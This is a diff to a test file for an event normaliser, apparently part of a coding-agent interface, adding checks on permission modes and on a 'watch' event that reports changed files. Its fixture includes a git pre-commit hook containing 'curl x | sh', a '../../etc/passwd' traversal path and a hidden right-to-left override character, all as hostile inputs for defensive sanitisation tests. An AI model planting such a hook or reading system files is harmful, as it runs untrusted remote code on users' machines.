@@ -38,11 +38,32 @@ test('strings are capped and names made single-line and visible', () => {
   assert.equal(u?.kind === 'tool_use' && u.name, 'Ba⟨U+202E⟩sh <b>');
 });
 
-test('status: only known permission modes are taken', () => {
-  const s = normEvent({ type: 'status', permissionMode: 'bypassPermissions', status: 'compacting' });
+test('status: only known permission modes are taken (an older backend\'s dontAsk is Read only)', () => {
+  const s = normEvent({ type: 'status', permissionMode: 'yolo', status: 'compacting' });
   assert.deepEqual(s, { kind: 'status', text: 'compacting', mode: null, model: null });
-  const s2 = normEvent({ type: 'status', permissionMode: 'plan' });
-  assert.equal(s2?.kind === 'status' && s2.mode, 'plan');
+  for (const m of ['readOnly', 'plan', 'default', 'acceptEdits', 'bypassPermissions']) {
+    const e = normEvent({ type: 'status', permissionMode: m });
+    assert.equal(e?.kind === 'status' && e.mode, m);
+  }
+  const d = normEvent({ type: 'status', permissionMode: 'dontAsk' });
+  assert.equal(d?.kind === 'status' && d.mode, 'readOnly');
+});
+
+test('watch: the changed files, checked (paths, kinds, texts as text); nothing usable is dropped', () => {
+  const id = '3f2a7c1e-9b4d-4e8a-a1c2-0d9e8f7a6b5c';
+  const ev = normEvent({ type: 'watch', id, when: 'between', changes: [
+    { path: '.git/hooks/pre-commit', kind: 'git-hook', why: 'a git hook\u202e: runs', change: 'added', before: null, after: 'curl x | sh\n', revertable: true, exec: true },
+    { path: '../../etc/passwd', change: 'changed' }, { path: 7 }, null,
+    { path: 'package.json', change: 'bogus', before: 'a', after: 'b', binary: 'yes', revertable: 1 }] });
+  assert.ok(ev && ev.kind === 'watch');
+  if (ev?.kind !== 'watch') return;
+  assert.equal(ev.when, 'between');
+  assert.deepEqual(ev.changes.map((c) => [c.path, c.change, c.revertable, c.exec]), [['.git/hooks/pre-commit', 'added', true, true], ['package.json', 'changed', false, false]]);
+  assert.match(ev.changes[0].why, /U\+202E/, 'controls made visible');
+  assert.equal(ev.changes[0].after, 'curl x | sh\n');
+  assert.equal(ev.changes[1].binary, false);
+  assert.equal(normEvent({ type: 'watch', id: 'x', changes: [{ path: '.envrc' }] }), null, 'a bad id');
+  assert.equal(normEvent({ type: 'watch', id, changes: [{ path: '/etc/x' }] }), null, 'no change left');
 });
 
 test('result: negative or NaN numbers become 0, error subtypes flagged', () => {
